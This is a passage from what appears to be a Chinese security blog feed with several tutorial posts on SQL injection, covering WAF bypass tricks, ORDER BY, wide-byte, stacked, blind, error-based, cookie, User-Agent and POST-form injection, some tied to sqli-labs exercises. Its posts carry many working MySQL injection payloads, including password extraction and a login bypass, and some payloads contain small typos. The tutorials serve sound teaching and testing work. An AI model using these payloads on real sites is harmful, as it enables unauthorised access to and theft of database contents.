<h2 id="资源限制角度"><a href="#资源限制角度" class="headerlink" title="资源限制角度"></a>资源限制角度</h2><p>利用发送http请求包的参数内容，过多消耗限制WAF资源，让WAF无法加载识别或者是让WAF”崩<br>崩”坏，从而实现绕过WAF。例如：服务器能接受的最大http协议请求包为10M，而WAF本身能接受最大的http协议请求包为5M，这时我们可以构造5-10Mhttp协议请求包来进行发送，让WAF超过了最大接受程度，从而”崩”坏达到绕过WAF的目的。或者我们可以在http协议请求包中添加大量的反复编码内容或者恶意代WAF对于这些大量不熟悉的参数内容难以识别或者干脆不识别，从而达到了绕过WAF的目的。</p>
<h2 id="协议层面"><a href="#协议层面" class="headerlink" title="协议层面"></a>协议层面</h2><p>这些的协议层面主要是指http协议，主要指在WAF中对协议中的内容或者某些参数解析和覆盖不全面，或者协议本身存在的缺陷，我们加以利用从而实现了对WAF绕过。同时我们还需要对web中间件服务器有充分的认识，因为每种服务器自身解析也是不一样的。</p>
<h2 id="规则层面缺陷"><a href="#规则层面缺陷" class="headerlink" title="规则层面缺陷"></a>规则层面缺陷</h2><p>规则层面的缺陷，往往是指基于正则规则相关层面。也就是我们常常看见绕过WAF规则的文章，百分之90文章都是从规则层面缺陷进行绕过的。因为大多数WAF都是基于安全规则来进行对网站的安全监控的，也就是认为设计好的安全规则。这种设计最大的缺陷就是本身规则就是存在缺陷，有时没有考虑到方方面面进行设置，攻击者可能从中构造出一些攻击变形的编码语句，不在这个安全规则之内识别不到，从而达到绕过WAF的目的。</p>
<h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><h2 id="大小写替换"><a href="#大小写替换" class="headerlink" title="大小写替换"></a>大小写替换</h2><p>对于mysql绕过，它的规则中可以进行了简单函数限制，但它却没有考虑到这些函数存在大小写等限制，所以我们可以对这些函数变换大写形式即可。</p>
<p>如: xxxx.com/index.php?id=-3’ uniON sEleCt 1,2,3–+</p>
<p>不过这种绕过方式往往都是最开始存在的，现在几乎见不到了</p>
<h2 id="双关键字绕过"><a href="#双关键字绕过" class="headerlink" title="双关键字绕过"></a>双关键字绕过</h2><p>在一些简易的waf规则中，他是进行敏感关键字进行检测，一旦识别就会直接将其替换为空(但这里存在不合理的是，它只检测替换一次),所以我们就可以构造双写关键字进行绕过</p>
<p>如：id=-1’+UNIunionON+SeLselectECT1,2,3–-+</p>
<p>当它检测出union关键字时为空但经过我们拼接之后，又变成了UNION关键字。这里的+代替空格。</p>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>对于sql注入函数绕过，我们还可以结合一些编码知识原理进行绕过。例如：十六进制编码、url编码、unicode编码、数据库编码以及多种编码混合等。</p>
<p>1=1即31%3d%31</p>
<p>Test为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
<h2 id="关键字替换"><a href="#关键字替换" class="headerlink" title="关键字替换"></a>关键字替换</h2><p>因为sql函数存在很多很多，各种各样的。它的waf规则可能将常见的函数进行了过滤，但我们还有sql函数能够替换这些常见的函数功能。WAF如果没有对这些能够替换功能实现的函数纳入到它的规则当中，那我们使用这些也就能轻易绕过了。</p>
<p>常见函数替换 常见函数替换:</p>
<p>hex()、 、bin()==&gt;ascii()</p>
<p>sleep()==&gt;benchmark()</p>
<p>concatws()==&gt;groupconcat()</p>
<p>mid()、substr()==&gt;substring()@@user==&gt;user()@@datadir==&gt;datadir() </p>
<h2 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h2><p>/xxx/是注释符，也可以充当空白符。因为// 可 使 得 MySQL 对 sql 语 句 (union//select) 词 法 解 析 成 功 。事 实 上 许 多 WAF 都 考 虑 到 都 考 虑 到 // 可 以 作 为 空 白 分 ， 但 是 waf 检 测 “/<em>.</em>/” 注 释 符 很 消 耗 网 站 性 能 ， 基 于 网 站 业 务 的 考 虑 ， 安 全 工 程 师 可 能 只 会 在 检 测 注 释 符 中 间 引 入 一 些 特 殊 字 符 ， 例 如 ： /\w+/ 。 或 者 ， WAF 可 能 只 中 间 检 查 n 个 字 符 “/<em>.{,n}</em>/” 。 *</p>
<p>根据以上想法，我们可以得出逐步测试绕过方法：</p>
<p>先测试最基本的：union//select</p>
<p>再 测 试 中 间 引 入 特 殊 字 ： union/aaaa%01bbs/select (注释符内添加特殊字符)</p>
<p>最 后 测 试 注 释 长 度 ： union/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/select (注释符内添加长度)</p>
<p>同 理 ， 对 于 /!xxx/(相当于/sql 语 句 /) ， 可 以 采 取 类 似 的 思 路 绕 过 WAF 。</p>
<h2 id="空白符绕过"><a href="#空白符绕过" class="headerlink" title="空白符绕过"></a>空白符绕过</h2><p>基于正则表达式的WAF，SQL注入规则使用正则表达式的“\s”匹配空格，例如”select\s+union”。利用正则表达式的空白符与MySQL空白符的不同可绕过WAF规则。如何找到这些MySQL的特性？通过fuzz,每次更改正常SQL语句的某部分替换为其他字符，判断语法是否正确，即可判断出来MySQL语法特性。当然，也可以通过分析MySQL词法来发现语法特性，从而找到绕过方法。</p>
<p>利用空白符进行绕过，测试WAF时尽可能减少其他原因的影响，例如”union select”被拦截，只需把中间空白符替换为”%250C”, “%25A0”， “%09%0A %0B %0C %0D %A0 %20 //“进行绕过测试</p>
<p>union%250Cselect</p>
<p>union%25A0select</p>
<h2 id="sql注入黑魔法"><a href="#sql注入黑魔法" class="headerlink" title="sql注入黑魔法"></a>sql注入黑魔法</h2><p>我们在进行sql注入过程中，我们需要对数据库语法和结构有个清晰的了解。比如一些特殊的mysql语法常常就会没有被纳入到WAF 的规则当中去。</p>
<p>select{x tablename}from{x informationschema.tables};</p>
<h2 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h2><p>当我们平时sql注入当中的常规字符都是WAF吞掉过滤的时候，我们就可以尝试下一些特殊字符进行过滤检测。。如：~，!，@，{x key}，1.1，1e1，()，emoji表情符号@:=等等。不过一般这些特殊字符我们都是用来进行fuzz测试，看看能不能绕过waf检测测试，然后我们在将这些特殊字符进行sql语句构造拼接，看看能不能将其进行利用。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>sql注入绕WAF=熟悉mysql函数和数据库特性+了解web中间件服务器原理+掌握WAF的原理机制。</p>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之order by后注入]]></title>
      <url>/2019/08/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="Order-By-后的注入"><a href="#Order-By-后的注入" class="headerlink" title="Order By 后的注入"></a>Order By 后的注入</h1><h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 desc</span><br><span class="line">?sort=1 asc</span><br></pre></td></tr></table></figure>

<p>显示结果不同，说明可以注入</p>
<p><code>desc是 descend 降序意思</code><br><code>asc 是 ascend 升序意思</code></p>
<h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><p>order by 后的数字可以作为一个注入点</p>
<p><code>?sort=right(version(),1)</code></p>
<p><code>?sort=left(version(),1)</code></p>
<p>如果没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>(1)直接添加注入语句，?sort=(select ***)</p>
<p>(2)利用一些函数，例如 rand()函数等。?sort=rand(sql 语句)</p>
<p>(3) 利用 and，例如 ?sort=1 and (加 sql 语句)。</p>
<h2 id="报错注入例子"><a href="#报错注入例子" class="headerlink" title="报错注入例子"></a>报错注入例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))</span><br></pre></td></tr></table></figure>

<h2 id="rand-例子"><a href="#rand-例子" class="headerlink" title="rand() 例子"></a>rand() 例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(left(database(),1))=115)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(left(database(),1))=116)</span><br></pre></td></tr></table></figure>

<h2 id="延时注入例子"><a href="#延时注入例子" class="headerlink" title="延时注入例子"></a>延时注入例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5))</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之宽字节和堆叠注入]]></title>
      <url>/2019/08/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="sqli-labs32"><a href="#sqli-labs32" class="headerlink" title="sqli-labs32"></a>sqli-labs32</h2><p>过滤\、’、”的函数，分别在前面加上\</p>
<blockquote>
<p>判断：1’、1”都能正常回显，可以猜测输入的引号被过滤</p>
</blockquote>
<p>（1）%df 吃掉 \ 具体的原因是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df，形成 %df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此事 %df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的</p>
<p>（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</p>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="sqli-labs38"><a href="#sqli-labs38" class="headerlink" title="sqli-labs38"></a>sqli-labs38</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句</p>
<blockquote>
<p>我们可以利用堆叠注入进行增删改查等操作</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload：?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>;;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="number">13</span>,<span class="string">'wisejay'</span>,<span class="string">'wisejay'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之盲注]]></title>
      <url>/2019/08/19/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/</url>
      <content type="html"><![CDATA[<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><code>sql注入的一种，之所以被称为盲注，因为它不会根据你插入的恶意的sql注入语句来 返回你所需要的信息。</code></p>
<h1 id="盲注分类"><a href="#盲注分类" class="headerlink" title="盲注分类"></a>盲注分类</h1><ol>
<li><p>布尔盲注</p>
</li>
<li><p>时间盲注</p>
</li>
<li><p>报错盲注</p>
</li>
</ol>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="布尔注入原理"><a href="#布尔注入原理" class="headerlink" title="布尔注入原理"></a>布尔注入原理</h2><p>布尔盲注时，也就相当于”逻辑”注入。我们在注入的过程，页面呈现给我们的就是一个布尔值：true/flase.我们可以跟住这个布尔值来进行有效判断。 如果是ture则返回网站正常页面，如果是是fales则返回一个错误页面，且页面上不会出现任何错误信息。</p>
<h2 id="布尔注入常用函数"><a href="#布尔注入常用函数" class="headerlink" title="布尔注入常用函数"></a>布尔注入常用函数</h2><h3 id="Left函数（s，n）"><a href="#Left函数（s，n）" class="headerlink" title="Left函数（s，n）"></a>Left函数（s，n）</h3><p>返回字符串s左边第n个值</p>
<h3 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h3><p>返回字符串的长度</p>
<h3 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h3><p>substr(string,start,length);</p>
<p>string为字符串；</p>
<p>start为字符串起始截取位置；</p>
<p>length为字符串长度;</p>
<h3 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h3><p>将字符串中最左边字符转换为相对应的ASCII代码值。</p>
<h3 id="regxp-函数"><a href="#regxp-函数" class="headerlink" title="regxp()函数"></a>regxp()函数</h3><p>正则表达式配对</p>
<h2 id="布尔使用方法"><a href="#布尔使用方法" class="headerlink" title="布尔使用方法"></a>布尔使用方法</h2><p>对于布尔注入使用方法，我们常常使用的是为二分法。假设数据是按升序排序的，对于给定值 x，从序列的中间位置开始比较，如果当前位置值等于 x，则查找成功；若 x 小于当前位置值，则在数列的前半段中选择中间的再次查找；若 x 大于当前位置值则在数列的后半段中选择中间的数继续查找， 直到找到为止。</p>
<h3 id="猜数据库长度"><a href="#猜数据库长度" class="headerlink" title="猜数据库长度"></a>猜数据库长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length(database()))&lt;10--+</span><br></pre></td></tr></table></figure>

<h3 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),1,1)))&gt;100--+</span><br></pre></td></tr></table></figure>

<h3 id="猜测表名"><a href="#猜测表名" class="headerlink" title="猜测表名"></a>猜测表名</h3><p>长度：</p>
<figure class="highlight plain"><figcaption><span>table_name from</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables where table_schema=database() limit 0,1)))&lt;10--+</span><br></pre></td></tr></table></figure>

<p>内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;116--+</span><br></pre></td></tr></table></figure>

<h3 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h3><p>长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1)))&gt;10 --+</span><br></pre></td></tr></table></figure>

<p>内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 --+</span><br></pre></td></tr></table></figure>

<h3 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h3><p>密码长度:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length(( select password from users limit 0,1)))=6--+</span><br></pre></td></tr></table></figure>

<p>密码内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+</span><br></pre></td></tr></table></figure>

<p>账号同理将password换成user。</p>
<h1 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h1><h2 id="时间注入原理"><a href="#时间注入原理" class="headerlink" title="时间注入原理"></a>时间注入原理</h2><p>通过sleep函数进行sql注入，查看页面返回信息速度是否明显延迟了对应的时间秒数。通过页面的延迟时间来判<br>断是否注入成功。但需要注意的是，时间注入返回的页面信息一样是没有回显错误的页面，我们只是根据页面延迟时间来进行猜测判断。</p>
<h2 id="时间注入函数"><a href="#时间注入函数" class="headerlink" title="时间注入函数"></a>时间注入函数</h2><h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h3><p>sleep(n)函数可以让数据库执行语句”停留”n秒时间，成功执行会返回0。而如果执行过程中断，会返回1。<br>sleep()函数可以让函数停留n秒时间，然后 返回０。如果程序被打断,则返回1。</p>
<h3 id="if-函数"><a href="#if-函数" class="headerlink" title="if()函数"></a>if()函数</h3><p>if(表达式1,表达式2,表达式3)</p>
<p>当表达式１是true，则会返回表达式２；否则返回表达式３。</p>
<h2 id="时间盲注使用方法"><a href="#时间盲注使用方法" class="headerlink" title="时间盲注使用方法"></a>时间盲注使用方法</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(1=0,1, sleep(5))--+</span><br></pre></td></tr></table></figure>

<h3 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h3><p>长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length(database())=8,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<p>内容:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h3 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h3><p>长度:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select tablen_ame from information_schema.tables where table_schema=&apos;security&apos; limit 1,1))=5,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<p>内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And If(ascii(substr((select tablen_ame from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),1,1))=117,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h3 id="猜列名-1"><a href="#猜列名-1" class="headerlink" title="猜列名"></a>猜列名</h3><p>长度:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;flag&apos; limit 1,1))=４,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<p>内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select columnname from informationschema.columns where tableschema=&apos;security&apos; and tablename=&apos;flag&apos; limit 1,1),1,1))=117,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h3 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select flag from security.flag limit 0,1))=4,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>一般都是基于数据库某些函数特性 函数特性和数据库本身的特性 数据库本身的特性来返回错误信息，从而获取到我们想要的数据库信息，从而实现我们sql注入的目的。</p>
<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><h3 id="floor函数-取整"><a href="#floor函数-取整" class="headerlink" title="floor函数(取整)"></a>floor函数(取整)</h3><p>sql注入的floor语句公式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>

<h3 id="exp-函数"><a href="#exp-函数" class="headerlink" title="exp()函数"></a>exp()函数</h3><p>用于计算e的x次方的函数。</p>
<blockquote>
<p>exp函数特性：在mysql数据库中，exp()只能计算710之内的数值，一旦超过或者等于710的话，则会进行整形报错溢出。提示：DOUBLE value is out of<br>range in ‘exp(710)’ double类型超出了exp(710)范围。</p>
</blockquote>
<blockquote>
<p>如果构造利用为~0的话，它是代表着按0按位取反就会返回“18446744073709551615”，得到最大的无符号BIGINT值。</p>
</blockquote>
<p><code>利用环境：mysql&gt;5.5.5
利用上述exp和~特性，我们可以构造成payload:and (EXP(~(select * from(select version())a)));</code></p>
<h3 id="数据重复报错"><a href="#数据重复报错" class="headerlink" title="数据重复报错"></a>数据重复报错</h3><p>利用环境：mysql低版本</p>
<pre><code>payload：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</code></pre><p>利用了数据库无法识别重复查询数据库版本信息的操作，从而进行报错。</p>
<h3 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h3><p>数据库环境:mysql 5.1.5</p>
<h4 id="updataxml-函数"><a href="#updataxml-函数" class="headerlink" title="updataxml()函数"></a>updataxml()函数</h4><p>UPDATEXML (XMLdocument, XPathstring, new_value);</p>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串)</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值（其实简单的说，就是对xml进行查询和修改）</p>
<h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h4><p>extractvalue(目标xml文档，xml路径)</p>
<p><code>作用:对xml进行查修和修改。</code></p>
<pre><code>payload: and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
payload: and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
payload：and (extractvalue(1,concat(0×7e,(version()),0×7e)));</code></pre><p>在这里我们先是查询了数据库的版本信息，而后concat函数进行连接字符串信息，然后利用xml语法进行查询和修改。但是我们却使用 0x7e进行拼接，0x7e是啥？这是特殊字符~进行十六进制转换的结果。同时updataxml函数是第二位置是拼接xml字符串，而extractvalue是需要xml路 径。至于xml具体语法我就不讲解了，这里0x7e嵌套在里面的话，xml语法是无法识别的，所以会进行报错，从而产生了报错得到我们想要的信息。</p>
<h1 id="其他盲注报错注入函数利用："><a href="#其他盲注报错注入函数利用：" class="headerlink" title="其他盲注报错注入函数利用："></a>其他盲注报错注入函数利用：</h1><p>GeometryCollection()</p>
<p>id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</p>
<p>polygon()</p>
<p>id =1 AND polygon((select * from(select * from(select user())a)b))</p>
<p>multipoint()</p>
<p>id = 1 AND multipoint((select * from(select * from(select user())a)b))</p>
<p>multilinestring()</p>
<p>id = 1 AND multilinestring((select * from(select * from(select user())a)b))</p>
<p>linestring()</p>
<p>id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</p>
<p>multipolygon()</p>
<p>id =1 AND multipolygon((select * from(select * from(select user())a)b))</p>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之cookie和user-agent注入]]></title>
      <url>/2019/08/17/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bcookie%E5%92%8Cuser-agent%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="cookie简介"><a href="#cookie简介" class="headerlink" title="cookie简介"></a>cookie简介</h2><p>cookie是一串加密过的数据，是网站为了辨别用户身份而存在在用户本地终端。简单理解。它就是一个用户身份凭证，并保存在本地客户端。</p>
<p>它的请求原理大概为这个：用户使用浏览器第一次访问网站服务器时，服务器会返回给用户浏览器一段数据，浏览器将其保存到本地，以后用户使用浏览器每次再访问网站服务器时，请求都带着这个cookie数据来标明自己用户的身份。</p>
<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>cookie注入，简单理解为http协议包中对cookie值进行sql注入。与之前get，post也是相似的，只是注入点位置不一样罢了。</p>
<h2 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h2><blockquote>
<p>Cookie: uname=admin’</p>
</blockquote>
<h2 id="查询数据库版本信息"><a href="#查询数据库版本信息" class="headerlink" title="查询数据库版本信息"></a>查询数据库版本信息</h2><blockquote>
<p>Cookie: uname=admin’ and (extractvalue(1,concat(0x7e,(select @@version),0x7e)))#</p>
</blockquote>
<p>这里套用extractvalue()函数报错</p>
<h2 id="查询当前数据库名称"><a href="#查询当前数据库名称" class="headerlink" title="查询当前数据库名称"></a>查询当前数据库名称</h2><blockquote>
<p>Cookie: uname=admin’ and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#</p>
</blockquote>
<p>接下来关于查询表名，字段名和数据，就是中间select子查询部分更换下sql注入语句就好了</p>
<h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><h2 id="user-agent简介"><a href="#user-agent简介" class="headerlink" title="user-agent简介"></a>user-agent简介</h2><p>user-agen也是http协议请求携带的参数信息。它名为用户代理。主要是用于告知服务器知道客户端一些终端信息。user-gent往往包含着以下客户端内容：使用的浏览器及版本号、操作系统版本等等。</p>
<h2 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h2><blockquote>
<p>User-Agent:’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
</blockquote>
<h2 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h2><blockquote>
<p>User-Agent:’and extractvalue(1,concat(0x7e,(select database()),0x7e)) or ‘1’=’1</p>
</blockquote>
<h2 id="查询第三个数据库名"><a href="#查询第三个数据库名" class="headerlink" title="查询第三个数据库名"></a>查询第三个数据库名</h2><blockquote>
<p>User-Agent:’and extractvalue(1,concat(0x7e,(select schemaname from informationschema.schemata limit 3,1),0x7e)) or ‘1’=’1</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之POST注入]]></title>
      <url>/2019/08/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BPOST%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="post方法"><a href="#post方法" class="headerlink" title="post方法"></a>post方法</h1><p>向指定资源提交数据进行处理请求（提交表单、上传文件），有可能导致新的资源的建立或原有资源的修改</p>
<h1 id="Post注入"><a href="#Post注入" class="headerlink" title="Post注入"></a>Post注入</h1><p>POST注入一般分为两种，第一种绕过密码验证，第二种注入sql语句。</p>
<h2 id="绕过密码验证"><a href="#绕过密码验证" class="headerlink" title="绕过密码验证"></a>绕过密码验证</h2><blockquote>
<p>1’ or 1=1 #</p>
</blockquote>
<p>由于sql语句中，or运算符的优先级是大于and我们发现１or 1=1 我们可以得知，1=1恒为真，or两侧只有有一个为真结果即为真。而#则直接注释掉了后面的sql语句，所以我们就能够直接绕过密码 直接进行登录。</p>
<h2 id="注入sql语句"><a href="#注入sql语句" class="headerlink" title="注入sql语句"></a>注入sql语句</h2><h3 id="判断闭合参数"><a href="#判断闭合参数" class="headerlink" title="判断闭合参数"></a>判断闭合参数</h3><p>我们用户名的输入框中加入１’，然后在密码中随便输入个123</p>
<h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><blockquote>
<p>1’ order by 3 #</p>
</blockquote>
<h3 id="查询数据库名称"><a href="#查询数据库名称" class="headerlink" title="查询数据库名称"></a>查询数据库名称</h3><blockquote>
<p>1’ union select 1,database() #</p>
</blockquote>
<p>后面的注入方法与get注入相同，大家可以进行尝试完成。</p>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入之双查询注入]]></title>
      <url>/2019/08/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
